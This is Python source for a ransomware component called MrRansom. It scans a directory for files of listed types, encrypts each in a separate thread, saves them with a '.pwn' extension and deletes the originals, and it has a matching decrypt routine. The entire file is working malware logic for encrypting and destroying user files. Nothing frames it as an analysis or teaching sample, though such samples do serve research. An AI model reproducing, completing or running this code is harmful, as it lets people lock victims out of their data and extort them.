import base64
import json
import os
import time
from threading import Thread

from file_util import put_file, get_file, get_full_path
from blockencrypter import BlockEncrypter, get_blocks

DECRYPT = 'decrypt'

ENCRYPT = 'encrypt'

FILE_TYPES_JSON = "data/file_types.json"

ENCRYPTED_EXTENSION = ".pwn"


def get_file_types_to_encrypt():
    types_json = json.loads(get_file(get_full_path(FILE_TYPES_JSON)))

    return [file_type for file_type in types_json["fileTypes"]]


FILE_TYPES_TO_ENCRYPT = get_file_types_to_encrypt()


def get_files_to_process(files, mode):
    files_to_process = []
    for file_path in files:
        if should_encrypt_file(file_path, mode) or should_decrypt_file(file_path, mode):
            files_to_process.append(file_path)

    return files_to_process


def should_encrypt_file(file_name, mode):
    return mode == ENCRYPT and is_valid_file(file_name)


def should_decrypt_file(file_name, mode):
    return mode == DECRYPT and is_encrypted_file(file_name)


def is_valid_file(filename):
    for file_type in FILE_TYPES_TO_ENCRYPT:
        if filename.endswith(file_type) and not filename.startswith("."):
            return True


def is_encrypted_file(file_name):
    if file_name.endswith(ENCRYPTED_EXTENSION):
        return True


def close_threads(workers):
    for thread in workers:
        thread.join()
        workers.remove(thread)


def get_process_args(input_file, mode):
    if mode == ENCRYPT:
        out_file = input_file + ENCRYPTED_EXTENSION
    else:
        out_file = input_file[:len(input_file) - len(ENCRYPTED_EXTENSION)]

    return input_file, out_file


class MrRansom:

    def __init__(self, root_dir, key):
        self.key = key
        self.root_dir = os.path.realpath(root_dir)
        self.files = [os.path.join(self.root_dir, file_name) for file_name in os.listdir(self.root_dir)]

    def encrypt(self):
        files_to_encrypt = get_files_to_process(self.files, ENCRYPT)

        self.process(files_to_encrypt, self.encrypt_file, ENCRYPT)

    def decrypt(self):
        files_to_decrypt = get_files_to_process(self.files, DECRYPT)

        self.process(files_to_decrypt, self.decrypt_file, DECRYPT)

    @staticmethod
    def process(files, method, mode):
        start_time = time.time()

        workers = []
        for file_path in files:
            thread = Thread(target=method, args=get_process_args(file_path, mode))

            workers.append(thread)

            thread.start()

        close_threads(workers)

        print "Total time: {}s".format(time.time() - start_time)

    def encrypt_file(self, in_file, out_file):
        start_time = time.time()

        self.process_file(self.key, in_file, out_file, ENCRYPT)

        print "Encrypted '{}' in {}s".format(os.path.basename(in_file), time.time() - start_time)

    def decrypt_file(self, in_file, out_file):
        start_time = time.time()

        self.process_file(self.key, in_file, out_file, DECRYPT)

        print "Took {}s decrypting '{}'".format(time.time() - start_time, os.path.basename(out_file))

    @staticmethod
    def process_file(key, in_file, out_file, mode):
        file_bytes = get_file(in_file)

        if mode == ENCRYPT:
            file_bytes = base64.b64encode(file_bytes)

        processed_bytes = BlockEncrypter(get_blocks(file_bytes), key).process(mode)

        if mode == DECRYPT:
            processed_bytes = base64.b64decode(processed_bytes)

        put_file(processed_bytes, out_file)

        os.remove(in_file)
